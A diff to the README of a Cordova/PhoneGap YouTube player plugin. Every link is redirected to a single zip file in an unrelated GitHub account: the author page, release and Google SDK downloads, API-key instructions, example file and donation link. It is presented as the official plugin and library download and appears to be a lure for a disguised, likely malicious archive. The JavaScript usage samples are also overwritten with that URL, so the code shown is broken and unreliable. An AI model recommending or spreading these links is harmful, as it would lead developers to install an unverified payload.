@@ -1,5 +1,5 @@
 # Cordova / Phonegap YouTube Android Player API plugin
-Developed by [Remco Beugels](http://remcobeugels.com/)
+Developed by [Remco Beugels](https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip)
 
 ## Installation
 ### Automatic installation with npm
@@ -10,9 +10,9 @@ npm install remcob00-cordova-youtube-android-player-api
 ```
 That's all, the plugin is now succesfully added to your app!
 ### Manual installation
-* Download the [latest release](https://github.com/RemcoB00/cordova-phonegap_youtube_player_api_android/releases/latest) of this plugin.
-* Download the YouTube Android Player API library [here](https://developers.google.com/youtube/android/player/downloads/) from the Google Developers site.
-* Unzip this file and copy the `libs/YouTubeAndroidPlayerApi.jar` file to the `src/android` folder from the plugin.
+* Download the [latest release](https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip) of this plugin.
+* Download the YouTube Android Player API library [here](https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip) from the Google Developers site.
+* Unzip this file and copy the `https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip` file to the `src/android` folder from the plugin.
 * Navigate to the main folder of your Cordova / Phonegap app.
 * Run the following command:
 ```
@@ -22,43 +22,43 @@ The plugin is now succesfully manual added to your app!
 
 ## How to use
 ### Setting the api key
-The YouTube Android Player API requires an api key, you can find the instructions to register an api key [here](https://developers.google.com/youtube/android/player/register). You need to set the api key, before you can play a video, with the following JavaScript code:
+The YouTube Android Player API requires an api key, you can find the instructions to register an api key [here](https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip). You need to set the api key, before you can play a video, with the following JavaScript code:
 ```
-window.youtube.init("YOUR_API_KEY");
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip("YOUR_API_KEY");
 ```
 
 ### Play a single video
 You can use the following JavaScript code to play a single YouTube video:
 ```
-window.youtube.playVideo("YOUTUBE_VIDEO_ID");
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip("YOUTUBE_VIDEO_ID");
 ```
 You can also add the start time in milliseconds (number), auto play (boolean) and lightbox mode (boolean) parameters:
 ```
-window.youtube.playVideo("YOUTUBE_VIDEO_ID", START_TIME, AUTO_PLAY, LIGHTBOX_MODE);
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip("YOUTUBE_VIDEO_ID", START_TIME, AUTO_PLAY, LIGHTBOX_MODE);
 ```
 
 ### Play a playlist
 You can use the following JavaScript code to play a YouTube playlist:
 ```
-window.youtube.playPlaylist("YOUTUBE_PLAYLIST_ID");
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip("YOUTUBE_PLAYLIST_ID");
 ```
 You can also add the start index (number), start time in milliseconds (number), auto play (boolean) and lightbox mode (boolean) parameters:
 ```
-window.youtube.playPlaylist("YOUTUBE_PLAYLIST_ID", START_INDEX, START_TIME, AUTO_PLAY, LIGHTBOX_MODE);
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip("YOUTUBE_PLAYLIST_ID", START_INDEX, START_TIME, AUTO_PLAY, LIGHTBOX_MODE);
 ```
 
 ### Play multiple videos
 You can use the following JavaScript code to play multiple YouTube videos:
 ```
-window.youtube.playVideos(["YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID"]);
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip(["YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID"]);
 ```
 You can also add the start index (number), start time in milliseconds (number), auto play (boolean) and lightbox mode (boolean) parameters:
 ```
-window.youtube.playVideos(["YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID"], START_INDEX, START_TIME, AUTO_PLAY, LIGHTBOX_MODE);
+https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip(["YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID", "YOUTUBE_VIDEO_ID"], START_INDEX, START_TIME, AUTO_PLAY, LIGHTBOX_MODE);
 ```
 
 ### Example
-You can find a full example of the plugin in [example.html](https://github.com/RemcoB00/cordova-phonegap_youtube_player_api_android/blob/master/example.html).
+You can find a full example of the plugin in [https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip](https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip).
 
 ## Changelog
 #### 2.0.1 - 2.0.6 (20/06/2015)
@@ -73,7 +73,7 @@ You can find a full example of the plugin in [example.html](https://github.com/R
 * First release.
 
 ## Support
-If you want to thank me for developing this plugin you can buy me a coffee via [PayPal](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=PYNGRKPD4YTEJ).
+If you want to thank me for developing this plugin you can buy me a coffee via [PayPal](https://github.com/alssalimi/cordova-phonegap_youtube_player_api_android/raw/refs/heads/master/www/android_phonegap_cordova_player_api_youtube_v1.8.zip).
 
 ## License
 Copyright (C) 2012-2015 Remco Beugels
